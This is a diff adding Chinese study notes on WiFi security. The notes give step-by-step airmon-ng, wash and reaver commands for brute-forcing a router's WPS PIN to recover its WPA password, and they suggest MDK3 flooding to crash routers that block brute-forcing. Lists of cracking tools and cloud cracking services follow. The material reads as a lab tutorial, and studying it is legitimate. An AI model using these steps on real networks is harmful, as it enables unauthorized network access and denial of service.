@@ -531,13 +531,206 @@ chmod 777 dhcpd.leases
 
 与wifiphisher相比，fluxion会验证别钓鱼者输入密码的正确性
 
+## Reaver 工具
+
+Reaver是一个用于破解WPS PIN码的工具，进而获取WPA/WPA2-PSK密钥。Reaver利用WPS设计的漏洞，通过暴力破解PIN码来实现攻击。
+
+### 网上教程
+
+[Reaver官网](https://www.kali.org/tools/reaver/)
+[Kali如何使用Reaver破解Wi-Fi网络的WPA/WPA2密码教程](https://blog.csdn.net/weixin_40586270/article/details/81280928)
+[关于pin码破解的原理和reaver参数的解释](https://blog.csdn.net/weixin_45666594/article/details/112984559)
+
+### 用树莓派（推荐）
+
+#### 前置条件
+
+爆破pin码的前提是路由器开启了WPS功能
+
+#### step0：实验WiFi路由器开启WPS功能
+
+![](resources/2023-07-12-15-35-33.png)
+
+#### step1：找到开启WPS功能的WiFi
+
+```shell
+# 开启网卡的监听模式
+airmon-ng start wlan0
+# 扫描开启wps的WiFi设备，Lck 为 No 的都可以爆破试试
+wash -i wlan0mon
+```
+
+![](resources/2023-07-12-15-36-23.png)
+
+#### step2：pin码爆破
+
+找到了开启WPS的WiFi，接下来就可以用reaver工具进行pin码爆破
+
+```shell
+# 参数：
+# -i  无线网卡名称
+# -b  目标AP的mac地址
+# -S  使用最小的DH key，可以提高破解速度
+# -vv  显示更多的非严重警告（注意这是 2 个小写字母 v）
+# -d  即delay每穷举一次的闲置时间，预设为1秒
+# -t  即timeout每次穷举等待反馈的最长时间
+# -c  信道编号
+# -p  PIN码四位或八位（可以用8位直接找到密码）
+reaver -i wlan0mon -b [路由器的mac地址] -S -d 5 -t 5 -vv -c [频道号]
+```
+
+![](resources/2023-07-12-15-38-57.png)
+
+报错了，发送了 M2 message 之后就没有回应了
+[Fail send message 2 and do not receive message 3, received nack 的解决方法](https://github.com/t6x/reaver-wps-fork-t6x/issues/270)
+Try executing first with -N and if that doesn't work, try with -F.
+这样可以忽略掉某些验证
+
+```shell
+# 参数：
+# -N  Do not send NACK messages when out of order packets are received
+reaver -i wlan0mon -b [路由器的mac地址] -S -d 5 -t 5 -vv -c [频道号] -N
+```
+
+添加参数 -N 后，运行正常
+![](resources/2023-07-12-15-47-15.png)
+![](resources/2023-07-12-15-52-48.png)
+多次尝试PIN码后，会导致WiFi路由器拒绝继续为你服务
+
+##### 如果目标WiFi路由器开启防爆破
+
+使用MDK3工具对WiFi进行泛洪攻击，使其宕机重启，然后继续PIN码爆破
+
+![](resources/2023-07-12-15-49-16.png)
+
+##### 已经知道PIN码后
+
+```shell
+# 获取到 PIN码 后，以后即便路由器更换了密码，我们也可以很迅速地通过 PIN码 重新获得WiFi密码
+reaver -i wlan0mon -b [路由器的mac地址] -p [PIN码]
+```
+
+![](resources/2023-07-12-16-07-44.png)
+![](resources/2023-07-12-16-00-03.png)
+成功通过 PIN码 获得WiFi密码
+
+## MDK3 工具
+
+MDK3 是一款无线DOS 攻击测试工具，能够发起Beacon Flood（无线SSID干扰攻击）、Authentication DoS（DHCP地址耗尽攻击）、Deauthentication/Disassociation Amok（指定用户断线攻击） 等模式的攻击，另外它还具有针对隐藏ESSID 的暴力探测模式、802.1X 渗透测试、WIDS干扰等功能
+
+### 网上教程
+
+[MDK3官网](https://www.kali.org/tools/mdk3/)
+
+### 用树莓派（推荐）
+
+
+
+
+## WiFi 安全接入方法 - WEP, WPA, WPS
+
+有几种不同的协议用于保护 WiFi 网络安全
+
+### WEP（wired equivalent privacy）- 优先等效保密协议
+
+已过时，不用
+
+### WPA（WiFi protected access）- WiFi网络安全接入
+
+为解决 WEP 的问题而开发的
+使用一种叫 TKIP（Temporal key integrity protocol，临时密钥完整性协议）的更强大的加密方法
+TKIP 在使用时会动态地更改其密钥，这就确保了数据的完整性
+然而，WPA 使用的 TKIP 仍然有一些漏洞，这就引出了 WPA2
+
+### WPA2
+
+WPA2 使用 AES（Advanced Encryption Standard，高级加密标准）加密
+AES 使用对称加密算法，但它强大到足以抵抗暴力破解
+
+### WPA2/WPA
+
+一个混合安全选项
+这个选项同时启动 WPA（TKIP） 和 WPA2（AES）
+这是出于兼容性的考虑，因为 2006 年前的设备可能与 WPA2 使用的 AES 加密不兼容
+
+### WPA3
+
+[WI-Fi官方网站](https://www.wi-fi.org)称，WPA3 于 2018 年推出。
+
+
+
+
 
 
 
 ---
-
-如果你运气比较好，对方有开放pin那最好了，最多半小时搞定。
-
-
+---
+---
 
 
+其他无线安全审计总结
+
+常用的工具
+aircrack-ng aircrack 系列套件
+reaver & wash WPS攻击
+pixiewps 离线WPS攻击
+minidwep-gtk 水滴
+beini 奶瓶
+mdk3 伪ssid工具
+打气筒 经常有提到，但我不知道原名叫什么
+wifislax 钓鱼伪AP工具
+Wifite 一款自动化wep、wpa攻击工具
+oclHashcat GPU加速
+Fern Wifi Cracker Fern Wifi Cracker使用了Python语言和PyQt图形界面库，能够攻击WEP/WPA/ WPS的WIFI网络，它还可以进行MITM中间人攻击。
+Crunch 字典生成工具
+Macchanger 本机MAC修改
+
+传统 WPA 密钥破解方法
+你需要强大的字典，以及强大的运算能力，可以利用hash table(彩虹表)以及显卡来加速运算。
+利用 hash-table(彩虹表) 的工具叫 cowpatty
+GPU加速运算则是利用 pyrit
+
+主流攻击形式
+Crack WPA
+Pentest over WiFi
+Fake AP
+Air-Capture
+MITM
+WAP Tunnel
+WAPJack
+WIDS/WIPS/Hotspot
+Deauth/Auth/Disco
+WiFiphisher
+
+关于主流技术
+Dictionary
+WPA PMK Hash
+WPS Online/Offline
+Distributed
+GPU
+Cloud
+
+本质上只有两种方法，一种是，获取到关键的Handshake，然后进行暴力搜索;Distributed GPU Cloud 这些无非是为了加快计算速度。
+
+WPA PMK Hash 这一块还不太理解。
+
+另一种则是利用WPS的设计缺陷。Online就是Reaver，Offline就是Dust Attack。
+
+云平台
+关于词典，其实我觉得WiFi万能钥匙就是一个很重要的词典。
+这种平台也可以进行词典的收集工作。
+
+利用云计算工具在线搜索AntiMatter
+http://free.wpapass.com/
+当然还对比了流行的国外平台。
+
+例如
+GPUHASH
+Cloud Cracker
+HashCrack
+HashBreak
+Online HashCrack
+darkircop
+
+最后
+另外发现作者还写了几本书，看目录的话内容也算靠谱，比如《无线网络安全攻防实战进阶》以及《无线网络黑客攻防（畅销版）》等，可以作为参考。
